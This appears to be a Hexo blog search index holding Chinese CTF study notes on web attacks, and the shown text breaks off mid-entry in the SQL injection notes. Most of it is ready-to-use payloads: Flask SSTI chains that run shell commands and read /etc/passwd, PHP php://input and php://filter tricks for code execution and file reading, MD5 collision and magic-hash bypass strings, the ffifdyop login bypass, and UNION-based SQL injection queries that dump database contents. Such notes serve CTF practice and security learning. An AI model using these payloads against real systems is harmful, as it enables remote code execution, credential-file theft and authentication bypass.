<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>flask_ssti</title>
    <link href="/2025/01/21/flask_ssti/"/>
    <url>/2025/01/21/flask_ssti/</url>
    
    <content type="html"><![CDATA[<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">__class__ 返回类型所属的对象<br>__mro__返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析，这里也就是<span class="hljs-keyword">class</span>返回的对象所属的类。<br><span class="hljs-symbol">__base__</span>返回该对象所继承的基类，这里也就是<span class="hljs-symbol">class</span>返回的对象所属的类。<br><span class="hljs-symbol">__subclasses__</span>返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><span class="hljs-symbol">__globals__</span>对包含函数全局变量的字典的引用，里面包括<br><span class="hljs-symbol">get_flashed_messages</span>() 返回在<span class="hljs-symbol">Flask</span>中通过 <span class="hljs-symbol">flash</span>() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用<span class="hljs-symbol">get_flashed_messages</span>() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。<br><br></code></pre></td></tr></table></figure><h3 id="class"><a href="#class" class="headerlink" title="__class__"></a><code>__class__</code></h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>是类中的一个内置属性，值是该实例的对应的类。这里使用的是<span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>，得到的则是空字符串对应的类，也就是字符类。这样操作的意义是将我们现在操作的对象切换到类上面去，这样才能进行之后继承与被继承的操作，所以这里可以选用其他数据类型再来调用<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>属性，效果是一样的(例如[].<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>、&#123;&#125;.<span class="hljs-number">__</span><span class="hljs-keyword">class</span><span class="hljs-number">__</span>、True.<span class="hljs-number">__</span><span class="hljs-keyword">class</span>等)。<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;Hello&quot;</span><br><span class="hljs-built_in">print</span>(s.__class__) <br></code></pre></td></tr></table></figure><p>在这个例子中，<code>s</code> 是一个字符串对象，<code>s.__class__</code> 将返回 <code>str</code> 类</p><h3 id="mro"><a href="#mro" class="headerlink" title="__mro__"></a><code>__mro__</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(B.__base__) <br></code></pre></td></tr></table></figure><p>这里 <code>B.__base__</code> 将返回 <code>A</code> 类，因为 <code>B</code> 直接继承自 <code>A</code>。</p><h3 id="base"><a href="#base" class="headerlink" title="__base__"></a><code>__base__</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">B</span>(<span class="hljs-title class_ inherited__">A</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(B.__base__) <br></code></pre></td></tr></table></figure><p>这里 <code>B.__base__</code> 将返回 <code>A</code> 类，因为 <code>B</code> 直接继承自 <code>A</code>。</p><h3 id="globals"><a href="#globals" class="headerlink" title="__globals__"></a><code>__globals__</code></h3><ul><li><p><strong>定义</strong>：<code>__globals__</code> 是一个属性，它返回一个包含函数或方法所在模块的全局变量的字典。对于函数和方法，它提供了对全局命名空间的访问。</p></li><li><p><strong>示例</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">func</span>():<br>    x = <span class="hljs-number">10</span><br>    <span class="hljs-built_in">print</span>(func.__globals__)<br><br>func()<br></code></pre></td></tr></table></figure><p>这里<code>func.__globals__</code>将返回一个包含当前模块的全局变量的字典，包括<code>func</code>函数本身，以及其他全局变量，如内置函数和导入的模块。</p></li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="查找基类object在第几个"><a href="#查找基类object在第几个" class="headerlink" title="查找基类object在第几个"></a>查找基类object在第几个</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__bases__<br></code></pre></td></tr></table></figure><h3 id="查看基类下的所有子类"><a href="#查看基类下的所有子类" class="headerlink" title="查看基类下的所有子类"></a>查看基类下的所有子类</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()<br></code></pre></td></tr></table></figure><h4 id="使用脚本查看指定子类的索引"><a href="#使用脚本查看指定子类的索引" class="headerlink" title="使用脚本查看指定子类的索引"></a>使用脚本查看指定子类的索引</h4><p> <a href="..%5Cpy%5Cssti.py">ssti.py</a> </p><h3 id="查看是否存在-builtins-（索引为134）"><a href="#查看是否存在-builtins-（索引为134）" class="headerlink" title="查看是否存在__builtins__（索引为134）"></a>查看是否存在<code>__builtins__</code>（索引为134）</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">[].<span class="hljs-emphasis">__class__</span>.<span class="hljs-emphasis">__base__</span>.<span class="hljs-emphasis">__subclasses__</span>()[134].<span class="hljs-emphasis">__init__</span>.<span class="hljs-emphasis">__globals__</span><br></code></pre></td></tr></table></figure><p>返回如 <code>&#39;__builtins__&#39;: &#123;&#39;__name__&#39;: &#39;builtins&#39;</code></p><h3 id="存在则查看eval函数"><a href="#存在则查看eval函数" class="headerlink" title="存在则查看eval函数"></a>存在则查看eval函数</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">[].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>()[134].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[%27<span class="hljs-strong">__builtins__</span>%27]<br></code></pre></td></tr></table></figure><p>返回<code>&#39;eval&#39;: &lt;built-in function eval&gt;</code></p><h3 id="执行eval导入os模块并查找flag"><a href="#执行eval导入os模块并查找flag" class="headerlink" title="执行eval导入os模块并查找flag"></a>执行eval导入os模块并查找flag</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">[].__class__.__base__.__subclasses__()[<span class="hljs-number">134</span>].__init__.__globals__[<span class="hljs-variable">%27__builtins_</span>_<span class="hljs-variable">%27</span>].eval(<span class="hljs-string">&quot;__import__(<span class="hljs-variable">%2</span>7os<span class="hljs-variable">%27</span>).popen(<span class="hljs-variable">%2</span>7cat<span class="hljs-variable">%2</span>0flag<span class="hljs-variable">%27</span>).read()&quot;</span>)<br></code></pre></td></tr></table></figure><p>**.popen()<strong>和</strong>.read()**合用可以回显，使用system()只返回整型0或1</p><ul><li>Payload: <code>&#123;&#123; config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read() &#125;&#125;</code></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>ssti</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2025/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2025/01/21/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP-文件处理与协议流"><a href="#PHP-文件处理与协议流" class="headerlink" title="PHP 文件处理与协议流"></a>PHP 文件处理与协议流</h1><h2 id="1-php-filter-协议"><a href="#1-php-filter-协议" class="headerlink" title="1. php://filter 协议"></a>1. <code>php://filter</code> 协议</h2><p><code>php://filter</code> 可以获取指定文件的源码。当它与包含函数结合时，<code>php://filter</code> 流会被当作 PHP 文件执行。为了避免执行，通常对其进行编码，从而实现任意文件读取。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=&lt;编码方式&gt;/resource=&lt;文件路径&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>Base64 编码读取文件内容</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure><p>返回的数据是 Base64 编码后的文件内容。</p></li><li><p><strong>直接读取文件内容</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/resource=index.php</span><br></code></pre></td></tr></table></figure><p>返回未编码的原始文件内容。</p></li></ol><hr><h2 id="2-data-协议"><a href="#2-data-协议" class="headerlink" title="2. data:// 协议"></a>2. <code>data://</code> 协议</h2><p><code>data://</code> 是一种数据流封装器，用于传递相应格式的数据。当它与包含函数（如 <code>include</code>）结合时，用户输入的 <code>data://</code> 流会被当作 PHP 文件执行。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//&lt;数据流类型&gt;;&lt;编码格式&gt;,&lt;数据&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>Base64 编码数据</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain;base64,SSBsb3ZlIFBIUAo=</span><br></code></pre></td></tr></table></figure><p>解码后为：<code>I love PHP</code>。</p></li><li><p><strong>普通文本数据</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">data:<span class="hljs-comment">//text/plain,welcome to the zjctf</span><br></code></pre></td></tr></table></figure><p>直接显示：<code>welcome to the zjctf</code>。</p></li></ol><hr><h2 id="3-php-input-协议"><a href="#3-php-input-协议" class="headerlink" title="3. php://input 协议"></a>3. <code>php://input</code> 协议</h2><p>当遇到 <code>file_get_contents()</code> 函数时，可以使用 <code>php://input</code> 绕过。<code>php://input</code> 可以访问请求的原始数据的只读流，将 POST 请求的数据当作 PHP 代码执行。</p><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ul><li>当传入的参数作为文件名打开时，可以将参数设为 <code>php://input</code>，同时 POST 想要设置的文件内容。PHP 执行时会将 POST 内容当作文件内容，从而导致任意代码执行。</li></ul><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><ol><li><p><strong>请求 URL</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/cmd.php?cmd=php:/</span>/input<br></code></pre></td></tr></table></figure></li><li><p><strong>POST 数据</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="4-file-协议"><a href="#4-file-协议" class="headerlink" title="4. file:// 协议"></a>4. <code>file://</code> 协议</h2><p><code>file://</code> 用于访问本地文件系统。</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//&lt;文件的绝对路径与文件名&gt;</span><br></code></pre></td></tr></table></figure><h3 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">file:<span class="hljs-comment">//D:/flag.txt</span><br></code></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th align="left">协议</th><th align="left">用途</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left"><code>php://filter</code></td><td align="left">读取文件内容，支持编码</td><td align="left"><code>php://filter/read=convert.base64-encode/resource=index.php</code></td></tr><tr><td align="left"><code>data://</code></td><td align="left">传递数据流，支持编码</td><td align="left"><code>data://text/plain;base64,SSBsb3ZlIFBIUAo=</code></td></tr><tr><td align="left"><code>php://input</code></td><td align="left">读取 POST 请求的原始数据</td><td align="left"><code>http://127.0.0.1/cmd.php?cmd=php://input</code> + POST <code>&lt;?php phpinfo();?&gt;</code></td></tr><tr><td align="left"><code>file://</code></td><td align="left">访问本地文件系统</td><td align="left"><code>file://D:/flag.txt</code></td></tr></tbody></table><hr>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>md5绕过</title>
    <link href="/2025/01/21/md5%E7%BB%95%E8%BF%87/"/>
    <url>/2025/01/21/md5%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="相关口诀"><a href="#相关口诀" class="headerlink" title="相关口诀"></a>相关口诀</h1><blockquote><p>数组绕过，0e绕过</p><p>QNKCDZO 240610708 常用</p><p>md5($a)&#x3D;&#x3D;md5(md5($a))</p><p>0e215962017</p><p><a href="https://so.csdn.net/so/search?q=MD5%E5%8A%A0%E5%AF%86&spm=1001.2101.3001.7020">MD5加密</a>登录万能通用</p><p>ffifdyop</p></blockquote><h1 id="数组绕过-通用"><a href="#数组绕过-通用" class="headerlink" title="数组绕过(通用)"></a>数组绕过(通用)</h1><p>payload：?a[]&#x3D;1&amp;b[]&#x3D;2</p><h1 id="md5弱比较"><a href="#md5弱比较" class="headerlink" title="md5弱比较"></a>md5弱比较</h1><h2 id="转换规则："><a href="#转换规则：" class="headerlink" title="转换规则："></a>转换规则：</h2><p>   1.字符型和字符型比较，为同类型，比较其内容，例’’abc’’&#x3D;&#x3D;’’c’’ &#x3D;&gt; false</p><p>   2.数字型和数字型比较，同上，例：123 &#x3D;&#x3D; 12 &#x3D;&gt; false</p><pre><code class="hljs">                                                     123 ==123=&gt; true</code></pre><p>   3.字符型和数字型比较，若字符型值开头为数字，转为数字；</p><pre><code class="hljs">                                      若开头不为数字，为 null 弱比较与 0 相等。                                   例：&#39;&#39;abc123&#39;&#39;==123 =&gt; false                                          &quot;123abc&quot;==123 =&gt; true                                          &#39;&#39;abc123&#39;&#39;==0 =&gt; true                                          &#39;&#39;123&#39;&#39;==123 =&gt; true                                         &#39;&#39;123abc&#39;&#39;==12 =&gt; false</code></pre><h2 id="字符型和数值型的弱比较"><a href="#字符型和数值型的弱比较" class="headerlink" title="字符型和数值型的弱比较"></a>字符型和数值型的弱比较</h2><pre><code class="hljs">  比较原理：  先看字符串开头是否为数字                如果为数字，则截止到连续数字的最后一个数字，即&quot;123abc456&quot;=&gt;123                如果不为数字，则判断为false，即&quot;abc123456&quot;=&gt;0</code></pre><p>实例：</p><p>(“123abc”&#x3D;&#x3D;123) &#x3D;&gt; true</p><p>(“123”&#x3D;&#x3D;123) &#x3D;&gt; true</p><p>(“123abc”&#x3D;&#x3D;”123”) &#x3D;&gt; false</p><p>(“abc123”&#x3D;&#x3D;0) &#x3D;&gt; true</p><h2 id="字符型和字符型的比较"><a href="#字符型和字符型的比较" class="headerlink" title="字符型和字符型的比较"></a>字符型和字符型的比较</h2><p>​      字符串的弱比较只能采用0e绕过，需要注意的是，0e后面不能有字母的存在</p><p>实例：</p><p>（”0e123456”&#x3D;&#x3D;”0e345”） &#x3D;&gt; true</p><p>（”0e12adfc”&#x3D;&#x3D;”0e345”） &#x3D;&gt; false</p><h2 id="布尔型和任意值的比较"><a href="#布尔型和任意值的比较" class="headerlink" title="布尔型和任意值的比较"></a>布尔型和任意值的比较</h2><pre><code class="hljs">布尔值true和任意字符串和数值都弱相等，除了0和false，因为0也认为是bool false，true是不等于false的</code></pre><p>实例：</p><p>(true&#x3D;&#x3D;’’false’’) &#x3D;&gt; false</p><p>(0&#x3D;&#x3D;’’false’’) &#x3D;&gt; true</p><p>(true&#x3D;&#x3D;0) &#x3D;&gt; false</p><p>(true&#x3D;&#x3D;’’abc’’) &#x3D;&gt;true</p><p>(true&#x3D;&#x3D;’’123abc’’) &#x3D;&gt;true</p><h1 id="md5弱类型绕过"><a href="#md5弱类型绕过" class="headerlink" title="md5弱类型绕过"></a>md5弱类型绕过</h1><h2 id="0e绕过"><a href="#0e绕过" class="headerlink" title="0e绕过"></a>0e绕过</h2><h3 id="0e绕过的原理"><a href="#0e绕过的原理" class="headerlink" title="0e绕过的原理"></a>0e绕过的原理</h3><p>科学记数法是一种记数的方法。</p><p>计算器表达10的幂一般是用E或e</p><p>如：2 760 000   &#x3D;    2.76×10^6    &#x3D;    2.76e6</p><p>所以0e，无论后面跟什么值，都是0</p><h4 id="常见的字符串md5值为0e开头"><a href="#常见的字符串md5值为0e开头" class="headerlink" title="常见的字符串md5值为0e开头"></a>常见的字符串md5值为0e开头</h4><p>加密后的密文                      原值</p><p>QNKCDZO           0E830400451993494058024219903391<br>240610708           0E462097431906509019562988736854<br>s878926199a       0E545993274517709034328855841020<br>s155964671a       0E342768416822451524974117254469<br>s214587387a       0E848240448830537924465865611904</p><p>0x01 一次md5的加密<br>$a&#x3D;$_GET[‘a’];</p><p>$b&#x3D;$_GET[‘b’];</p><p>md5($a)&#x3D;&#x3D;md5($b)</p><p>payload：?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p><p>0x02 一次md5的加密<br>$a&#x3D;$_GET[‘a’];</p><p>$a&#x3D;&#x3D;md5($a);</p><p>payload：?a&#x3D;0e215962017</p><p>因为md5(“0e215962017”)&#x3D;0e291242476940776845150308577824</p><p>0x03 两次md5的加密<br>$a&#x3D;$_GET[‘a’];</p><p>$a&#x3D;&#x3D;md5($a);</p><p>payload：?md5(md5(0E830400451993494058024219903391))&#x3D;0E545993274517709034328855841020</p><h1 id="md5强类型绕过"><a href="#md5强类型绕过" class="headerlink" title="md5强类型绕过"></a>md5强类型绕过</h1><h2 id="md5值完全相同的字符绕过"><a href="#md5值完全相同的字符绕过" class="headerlink" title="md5值完全相同的字符绕过"></a>md5值完全相同的字符绕过</h2><p>$a&#x3D;$_GET[‘a’];</p><p>$b&#x3D;$_GET[‘b’];</p><p>md5($a)&#x3D;&#x3D;&#x3D;md5($b)</p><p>payload：?a&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><h3 id="两个MD5值完全相同的字符"><a href="#两个MD5值完全相同的字符" class="headerlink" title="两个MD5值完全相同的字符"></a>两个MD5值完全相同的字符</h3><p>array1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p><p>array2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p><h3 id="此时插入sha1值完全相同的字符"><a href="#此时插入sha1值完全相同的字符" class="headerlink" title="此时插入sha1值完全相同的字符"></a>此时插入sha1值完全相同的字符</h3><p>array1&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr&#x2F;%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</p><p>array2&#x3D;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C&#x2F;Width%202%200%20R&#x2F;Height%203%200%20R&#x2F;Type%204%200%20R&#x2F;Subtype%205%200%20R&#x2F;Filter%206%200%20R&#x2F;ColorSpace%207%200%20R&#x2F;Length%208%200%20R&#x2F;BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85&#x2F;%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%</p><h1 id="万能通式ffifdyop-绕过"><a href="#万能通式ffifdyop-绕过" class="headerlink" title="万能通式ffifdyop 绕过"></a>万能通式ffifdyop 绕过</h1><p>万能通式：129581926211651571912466741651878684928和ffifdyop</p><p>实例：</p><p>select * from ‘admin’ where password&#x3D;md5($pass,true)</p><p>输入md5(‘ffifdyop’,true)绕过</p><p>即</p><p>select * from ‘admin’ where password&#x3D;md5 ( ‘ ffifdyop ‘ ,true)</p><p>md5(string,raw)</p><p><img src="/../../../../tp/7058fe431c37d69d0b7ac16230b168e3.png" alt="7058fe431c37d69d0b7ac16230b168e3"></p><p>ffifdyop 这个字符串被 md5 哈希了后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是’ or ‘6<br>而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 select * from ‘admin’ where password&#x3D; ‘  ‘ or ‘6xxxxx ‘，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p><p>where password&#x3D;正确的密码or 1 ，代表永真，那么前面有没有密码都无所谓了</p><p>简单说，</p><p>select * from admin where password&#x3D; ‘    ‘  or’6&lt;乱码&gt;’</p><p>就相当于</p><p>select * from admin where password&#x3D;  ‘    ‘      or 1  实现sql注入</p><p>当两个条件中有任一个条件满足，“逻辑或”的运算结果就为“真”</p>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入攻击</title>
    <link href="/2025/01/21/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/01/21/sql%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入攻击"><a href="#SQL注入攻击" class="headerlink" title="SQL注入攻击"></a>SQL注入攻击</h1><h2 id="1-注入点识别"><a href="#1-注入点识别" class="headerlink" title="1. 注入点识别"></a>1. 注入点识别</h2><ul><li><strong>POST请求</strong>：使用 <code>#</code> 注释符，最好用 <code>%23</code> 代替。</li><li><strong>GET请求</strong>：使用 <code>--+</code> 注释符。</li><li><strong>ID错误</strong>：使用错误的ID以覆盖回显。</li></ul><h2 id="2-确定列数"><a href="#2-确定列数" class="headerlink" title="2. 确定列数"></a>2. 确定列数</h2><p>使用以下语句通过判断有无报错来确定列数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1#</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span>#<br><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3#</span><br></code></pre></td></tr></table></figure><h2 id="3-判断回显位"><a href="#3-判断回显位" class="headerlink" title="3. 判断回显位"></a>3. 判断回显位</h2><p>使用以下语句判断回显位：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,2,3#</span><br></code></pre></td></tr></table></figure><h2 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4. 获取数据库名"></a>4. 获取数据库名</h2><p>将 <code>database()</code> 放到回显位，其余位置用 <code>&#39;&#39;</code> 代替：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,database()#</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,database()&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="5-获取数据表名"><a href="#5-获取数据表名" class="headerlink" title="5. 获取数据表名"></a>5. 获取数据表名</h2><p>使用以下语句获取数据库下的所有数据表名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,table_name from information_schema.tables where table_schema=&#x27;</span>news<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><p>如果有多个数据表，使用 <code>group_concat(table_name)</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></code></pre></td></tr></table></figure><h2 id="6-获取字段名"><a href="#6-获取字段名" class="headerlink" title="6. 获取字段名"></a>6. 获取字段名</h2><p>使用以下语句获取某个表的所有字段名：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select &#x27;&#x27;,&#x27;&#x27;,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>secret_table<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure><h2 id="7-获取表内容"><a href="#7-获取表内容" class="headerlink" title="7. 获取表内容"></a>7. 获取表内容</h2><p>使用以下语句获取表内容：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 